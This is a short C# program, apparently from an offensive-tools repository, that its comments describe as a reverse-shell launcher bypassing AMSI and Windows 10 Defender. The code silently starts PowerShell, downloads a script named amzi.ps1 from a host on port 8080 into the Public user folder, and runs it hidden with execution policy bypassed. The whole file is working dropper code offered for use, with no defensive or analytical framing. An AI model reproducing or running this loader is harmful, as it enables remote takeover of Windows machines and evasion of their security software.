#Reverse shell by downloading amzi.ps1 and executing it in the background - Bypass AMSI & W10 Defender.
#amzi.ps1 -> https://github.com/0iphor13/Scripts-and-Exploits/blob/main/amzi.ps1
#Author: 0iphor13 

using System;
using System.Diagnostics;

namespace Wrapper{
    class Program{
        static void Main(){
            Process proc = new Process();
	    ProcessStartInfo procInfo = new ProcessStartInfo("powershell.exe" , "wget 'http://0.0.0.0:8080/amzi.ps1' -o C:\\Users\\Public\\amzi.ps1;Start-Sleep 1;powershell -ep bypass -WindowStyle hidden C:\\Users\\Public\\amzi.ps1");
	    procInfo.CreateNoWindow = true;
	    proc.StartInfo = procInfo;
            proc.Start();
        }
    }
}


